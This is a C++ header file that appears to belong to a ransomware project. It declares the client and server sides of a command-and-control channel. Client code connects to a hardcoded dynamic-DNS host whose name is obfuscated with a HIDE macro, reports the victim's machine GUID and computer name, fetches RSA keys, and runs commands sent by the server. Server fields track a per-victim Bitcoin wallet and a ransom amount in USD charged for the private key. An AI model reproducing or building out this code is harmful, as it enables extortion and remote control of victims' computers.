#pragma once

#include "ProcessManager.h"
#include "Framework.h"
#include "NetworkTypes.h"
#include "NetworkCommon.h"
#include "Win32Natives.h"
#include "Syscalls.h"

#include "External/obfuscate.h"
#include "External/base64.h"

#include <memory>
#include <algorithm>
#include <random>
#include <openssl/bio.h>
#include <filesystem>

//#pragma comment(lib, "ws2_32.lib")

#define WIN32_LEAN_AND_MEAN

const unsigned int UDP_PORT = 5454;
const std::string  DNS_NAME = std::string(HIDE("logicgate-test.ddns.net"));

class Client {
public:
    const std::string  GetDesktopName() const { return this->m_ComputerName; }
    void               SetDesktopName(auto name) { this->m_ComputerName = name; }
    const std::string  GetMachineGUID() const { return this->m_MachineGUID; }
    void               SetMachineGUID(auto name) { this->m_MachineGUID = name; }
    void               SetEncryptionKeys(RSAKeys& keys) { this->m_Secrets = keys; }
private:
    std::string        m_ComputerName = "unknown";  // remote host computer name. e.g DESKTOP-AJDU31S
    std::string        m_MachineGUID  = "unknown";  // remote host windows machine guid. e.g 831js9fka29-ajs93j19sa82....
    RSAKeys            m_Secrets      = {};         // Client RSA keys saved as strings
    SOCKET             m_UDPSocket    = INVALID_SOCKET;
    SOCKET             m_TCPSocket    = INVALID_SOCKET;

#ifdef CLIENT_RELEASE                               // Client only methods
public:
    Client();
    ~Client();
    BOOL               Connect();                   // Connect to the tcp server
    BOOL               Disconnect();                // Disconnect from the tcp server
    BYTESTRING         MakeTCPRequest(const ClientRequest& req, BOOL encrypted = FALSE); // send a message, receive the response
    BOOL               SendMessageToServer(const Server& dest, ClientMessage message, sockaddr_in udpAddr = NetCommon::_default);
    BOOL               SendMessageToServer(std::string message, BOOL encrypted = TRUE); // Send a encrypted string to TCP server
    BOOL               SendEncryptedMessageToServer(const Server& dest, ClientMessage message);
    BOOL               ListenForServerCommands();   // listen for commands from the server and perform them

    template <typename _Ty>
    BOOL               ReceiveMessageFromServer(const Server& who, _Ty& out, sockaddr_in& outAddr);
private:
    void               ReceiveCommandsFromServer(); // thread to continuously receive 'ServerCommand' messages from the server
    void               SetRemoteComputerName();     // set this->m_ComputerName to the current PCs desktop name
    void               SetRemoteMachineGUID();      // set this->m_MachineGUID to the current PCs windows machine guid
    BOOL               GetPublicRSAKeyFromServer(); // get public rsa key from server, save it to this->m_Secrets as a string
    BOOL               SendMachineGUIDToServer();   // send machine guid to tcp server. encrypted
    BOOL               SendComputerNameToServer();  // send desktop computer name to tcp server. encrypted

    ProcessManager     Remote = {};                 // remote host process manager
    Server             m_TCPServerDetails = {};     // details describing the tcp server
    Server             m_UDPServerDetails = {};     // details about the UDP communication

#elif defined(SERVER_RELEASE)                       // Server only client implementation
public:
    Client() = default;
    Client(SOCKET tcp, SOCKET udp, sockaddr_in addr);

    void               Disconnect(); // clean up and close sockets. free bio* secrets

    const sockaddr_in  GetAddressInfo()            const { return this->AddressInfo; }
    const RSAKeys&     GetSecrets()                const { return this->m_Secrets; }
    const SOCKET       GetSocket(SocketTypes type) const { return ( type == TCP ) ? this->m_TCPSocket : this->m_UDPSocket; }

    std::string        UniqueBTCWalletAddress;      // Wallet address to send ransom money to
    long               RansomAmountUSD  = 0;        // amount the client must pay for rsa private key in usd
    long               ClientUID        = -1;       // unique client id for the server
    sockaddr_in        AddressInfo      = {};       // Address info for the eserver to send messages over udp 
    BOOL               Alive = TRUE;

    /*
        Implementation for event handling- to wait
        for a new message to be sent from a client.

        Server will be listening from each client that connects with a thread.
        When data is received, it will be inserted into ClientResponse if ExpectingResponse
        is set to true by a function. This allows us to make a WaitForClientResponse function
        that sets expecting response to true and consistantly checks recent client response
        against last client response, waiting for a new client response.
    */
    BOOL               ExpectingResponse = FALSE; // Expecting a ClientResponse from a client not a clientREQUEST
    ClientResponse     RecentClientResponse;
    ClientResponse     LastClientResponse;
#endif
};